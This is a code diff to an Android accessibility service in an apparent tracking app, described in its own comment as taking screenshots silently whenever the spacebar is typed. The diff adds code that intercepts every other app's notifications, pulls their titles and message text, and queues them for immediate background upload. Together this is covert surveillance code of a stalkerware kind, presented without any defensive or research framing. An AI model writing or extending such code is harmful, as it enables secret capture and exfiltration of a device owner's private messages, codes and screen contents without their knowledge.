@@ -12,6 +12,7 @@ import android.view.Display;
 import android.view.KeyEvent;
 import android.os.PowerManager;
 import android.view.accessibility.AccessibilityEvent;
+import android.app.Notification;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -21,6 +22,7 @@ import java.util.Timer;
 import java.util.TimerTask;
 import java.util.UUID;
 import java.util.function.Consumer;
+import com.tracker.app.jobs.UploadJobService;
 
 /**
  * AccessibilityService that listens for global key events and takes screenshots silently.
@@ -183,11 +185,47 @@ public class SpacebarAccessibilityService extends AccessibilityService {
                         if (addedString.toString().contains(" ")) {
                             Log.d(TAG, "Space (soft keyboard) typed - triggering screenshot");
                             if (onSpacebarPressed != null) {
-                                onSpacebarPressed.run();
+                                  onSpacebarPressed.run();
                             }
                         }
                     }
                 }
+            }
+        } else if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+            try {
+                CharSequence pkg = event.getPackageName();
+                if (pkg == null) return;
+                
+                String packageName = pkg.toString();
+                // Exclude our own notification
+                if (packageName.equals(getPackageName())) return;
+                
+                if (event.getParcelableData() instanceof Notification) {
+                    Notification notification = (Notification) event.getParcelableData();
+                    if (notification.extras != null) {
+                        CharSequence titleChar = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
+                        CharSequence textChar = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
+                        
+                        String title = titleChar != null ? titleChar.toString() : "";
+                        String body = textChar != null ? textChar.toString() : "";
+                        
+                        // Fallback to tickerText if body is empty
+                        if (body.isEmpty() && notification.tickerText != null) {
+                            body = notification.tickerText.toString();
+                        }
+                        
+                        // Ignore empty notifications
+                        if (title.isEmpty() && body.isEmpty()) return;
+                        
+                        Log.d(TAG, "Notification intercepted: " + packageName + " | Title: " + title);
+                        UploadQueue.addNotification(packageName, title, body, System.currentTimeMillis());
+                        
+                        // Trigger upload immediately in the background
+                        UploadJobService.triggerNow(getApplicationContext());
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error parsing notification", e);
             }
         }
     }
